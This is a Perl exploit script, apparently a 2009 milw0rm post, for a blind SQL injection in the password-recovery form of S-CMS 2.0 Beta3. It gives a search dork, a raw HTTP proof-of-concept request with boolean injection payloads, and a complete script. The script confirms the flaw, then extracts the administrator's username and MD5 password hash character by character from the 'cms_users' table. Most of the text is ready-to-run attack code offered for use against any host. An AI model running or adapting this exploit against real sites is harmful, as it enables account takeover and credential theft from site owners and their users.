#!/usr/bin/perl
#***********************************************************************************************
#***********************************************************************************************
#**	       										      **
#**  											      **
#**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
#   [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
#**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
#**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
#   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    
#**							                                      **
#**    											      **
#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
#**					  ¡PROUD TO BE SPANISH!	                              **
#**											      **
#***********************************************************************************************
#***********************************************************************************************
#
#---------------------------------------------------------------------------------------------
#|       	   	   (Post Form var 'username') BLIND SQLi exploit         	     |
#|-------------------------------------------------------------------------------------------|
#|                                    |    S-CMS <= v-2.0 Beta3   |		    	     |
#|  CMS INFORMATION:          	       ---------------------------	               	     |
#|										             |
#|-->WEB: http://www.matteoiammarrone.com/public/s-cms/			       		     |
#|-->DOWNLOAD: http://www.matteoiammarrone.com/public/s-cms/		                     |
#|-->DEMO: N/A										     |
#|-->CATEGORY: CMS / Portal								     |
#|-->DESCRIPTION: Cms written in php and mysql, phpnuke style whit a plugins,                |
#|		blocks and permission system.                            		     |
#|-->RELEASED: 2009-05-25								     |
#|											     |
#|  CMS VULNERABILITY:									     |
#|											     |
#|-->TESTED ON: firefox 3						                     |
#|-->DORK: "S-CMS by matteoiamma"						             |
#|-->CATEGORY: BLIND SQLi exploit						             |
#|-->AFFECT VERSION: <= 2.0-Beta3					 		     |
#|-->Discovered Bug date: 2009-05-25							     |
#|-->Reported Bug date: 2009-05-25							     |
#|-->Fixed bug date: 2009-05-28								     |
#|-->Info patch(2.1): http://www.matteoiammarrone.com/public/s-cms/plugin.php?page=phpbb3    |
#|-->Author: YEnH4ckEr									     |
#|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
#|-->WEB/BLOG: N/A									     |
#|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.      |
#|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)		     |
#---------------------------------------------------------------------------------------------
#
#------------
#CONDITIONS:
#------------
#
#magic quotes=OFF
#
#{db_prefix} by default=cms
#
#-------
#NEED:
#-------
#
#Valid username
#
#---------------------------------------
#PROOF OF CONCEPT (SQL INJECTION):
#---------------------------------------
#
#POST http://[HOST]/[PATH]/plugin.php?page=your_account.php&mode=passlost HTTP/1.1
#Host: [HOST]
#User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10
#Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
#Accept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3
#Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
#Keep-Alive: 300
#Proxy-Connection: keep-alive
#Referer: http://[HOST]/[PATH]/html/plugin.php?page=your_account.php&mode=passlost
#
#username=pepe%27+or+1%3D%271&recupera_pass=Recover+password --> OK, sending code
#
#username=pepe%27+or+1%3D%270&recupera_pass=Recover+password --> Uhm?, username doesn't exist
#
#--------------
#WATCH VIDEOS
#--------------
#
# BSQLi --> http://www.youtube.com/watch?v=oVYrVcfA6Vo
#
# SQLi --> http://www.youtube.com/watch?v=S__l5IKzYNU
#      --> http://www.youtube.com/watch?v=LprQDdZ6ZcU
#
# LFI --> http://www.youtube.com/watch?v=2NhaNFbyP_w
#
#
##############################################################################
##############################################################################
##**************************************************************************##
##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!         ##
##**************************************************************************##
##--------------------------------------------------------------------------##
##**************************************************************************##
## GREETZ TO: JosS, Ulises2k, J.McCray, Evil1 and Spanish Hack3Rs community!##
##**************************************************************************##
##############################################################################
##############################################################################
#
#
use LWP::UserAgent;
use HTTP::Request;
#Subroutines
sub lw
{
	my $SO = $^O;
	my $linux = "";
	if (index(lc($SO),"win")!=-1){
		$linux="0";
	}else{
		$linux="1";
	}		
	if($linux){
		system("clear");
	}
	else{
		system("cls");
		system ("title S-CMS V-2.0 Beta3 Blind SQL Injection Exploit");
		system ("color 02");
	}
}
sub request {
	my $userag = LWP::UserAgent->new;
	$userag -> agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
	$request = HTTP::Request -> new(POST => $_[0]);
	$request->referer($_[0]);
	$request->content_type('application/x-www-form-urlencoded');
	$request->content($_[1]);
	my $outcode= $userag->request($request)->as_string;
	#print $outcode; #--> Active this line for debugger mode
	#print $request->as_string; #--> Active this line for debugger mode
	return $outcode;
}
sub error {
print "\t------------------------------------------------------------\n";
	print "\tWeb isn't vulnerable!\n\n";
	print "\t--->Maybe:\n\n";
	print "\t\t1.-Patched.\n";
	print "\t\t2.-Bad path or host.\n";
	print "\t\t3.-Bad username.\n";
	print "\t\t4.-db_prefix isn't 'cms'.\n";
	print "\t\t5.-Magic quotes ON'.\n";
	print "\t\tEXPLOIT FAILED!\n";
	print "\t------------------------------------------------------------\n";
}
sub testedblindsql {
	print "\t-----------------------------------------------------------------\n";
	print "\tWEB MAYBE BE VULNERABLE!\n\n";
	print "\tTested Blind SQL Injection.\n";		
	print "\tStarting exploit...\n"; 
	print "\t-----------------------------------------------------------------\n\n";
}
sub helper {
	print "\n\t[!!!] S-CMS V-2.0 Beta3 Blind SQL Injection Exploit\n";
	print "\t[!!!] USAGE MODE: [!!!]\n";
	print "\t[!!!] perl $0 [HOST] [PATH] [USER]\n";
	print "\t[!!!] [HOST]: Web.\n";
	print "\t[!!!] [PATH]: Home Path.\n";
	print "\t[!!!] [USER]: Username for fish\n";
	print "\t[!!!] Example: perl $0 'www.example.com' 'demo' 'y3nh4ck3r'\n";
}
sub brute_length{
#Username length
$exit=0;
$i=0;
while($exit==0){
	my $blindsql="username=".$_[1]."'+AND+(SELECT+length(username)+FROM+cms_users+WHERE+uid=1)='".$i++."&recupera_pass=Recover+password"; #injected code
	$output=&request($_[0],$blindsql);
	if($output =~ (/\<center\>Generate a confirmation code that was sent via email\.\<\/center\>/)){
		$exit=1;
	}else{
		$exit=0;
	}
	#This is the max length of username
	if($i>50){
	&error;
	exit(1);
	}
}
#Save column length
$length=$i-1;
print "\t<<<<<--------------------------------------------------------->>>>>\n";
print "\tLength catched!\n";
print "\tLength Username --> ".$length."\n";
print "\tWait several minutes...\n";
print "\t<<<<<--------------------------------------------------------->>>>>\n\n";
return $length;
}
sub exploiting {
#Bruteforcing values
$values="";
$k=1;
	$z=45;
	while(($k<=$_[1]) && ($z<=126)){
		my $blindsql="username=".$_[3]."'+AND+ascii(substring((SELECT+".$_[2]."+FROM+cms_users+WHERE+uid=1),".$k.",1))='".$z."&recupera_pass=Recover+password";
		$output=&request($_[0],$blindsql);
		if($output =~ (/\<center\>Generate a confirmation code that was sent via email.\<\/center\>/))
		{
			$values=$values.chr($z);
			$k++;
			$z=45;
		}
#new char
	$z++; 
	}
return $values;
}
#Main
&lw;
print "\t#######################################################\n\n";
print "\t#######################################################\n\n";
print "\t##   S-CMS V-2.0 Beta3 Blind SQL Injection Exploit   ##\n\n";
print "\t##           Blind SQL Injection Exploit             ##\n\n"; 
print "\t##       ++Conditions: magic_quotes=OFF              ##\n\n";
print "\t##       ++Needed: Valid username (USER)             ##\n\n";
print "\t##               Author: Y3nh4ck3r                   ##\n\n";
print "\t##      Contact:y3nh4ck3r[at]gmail[dot]com           ##\n\n";
print "\t##            Proud to be Spanish!                   ##\n\n";
print "\t#######################################################\n\n";
print "\t#######################################################\n\n";
#Init variables
my $host=$ARGV[0];
my $path=$ARGV[1];
my $userforfish=$ARGV[2];
$numArgs = $#ARGV + 1;
if($numArgs<=2) 
	{
		&helper;
		exit(1);	
	}	
#Build uri
my $finalhost="http://".$host."/".$path."/plugin.php?page=your_account.php&mode=passlost";
$finalrequest = $finalhost;	
#Testing blind sql injection and magic_quotes (any error?)
$send_post1="username=".$userforfish."%27+or+1%3D%271&recupera_pass=Recover+password";
$output1=&request($finalrequest,$send_post1);
$send_post2="username=".$userforfish."%27+or+1%3D%270&recupera_pass=Recover+password";
$output2=&request($finalrequest,$send_post2);
if ($output1 eq $output2)
{    
	#Not injectable
	&error;
	exit(1); 
}else{ 
	#blind sql injection is available
	&testedblindsql;
}
#Bruteforcing length
$length_user=&brute_length($finalrequest,$userforfish);	
#Bruteforcing username...
$user=&exploiting($finalrequest,$length_user,'username',$userforfish);
#Bruteforcing password md5 hash...
$pwhash=&exploiting($finalrequest,32,'password',$userforfish);
#final checking
if((!$user) || (!$pwhash)){
	&error;
	exit(1);
}
print "\n\t\t*************************************************\n";
print "\t\t*********  EXPLOIT EXECUTED SUCCESSFULLY ********\n";
print "\t\t*************************************************\n\n";
print "\t\tAdmin-username: ".$user."\n";
print "\t\tAdmin-password: ".$pwhash."\n\n";
print "\n\t\t<<----------------------FINISH!-------------------->>\n\n";
print "\t\t<<---------------Thanks to: y3hn4ck3r-------------->>\n\n";
print "\t\t<<------------------------EOF---------------------->>\n\n";
exit(1);
#Ok...all job done

# milw0rm.com [2009-06-09]
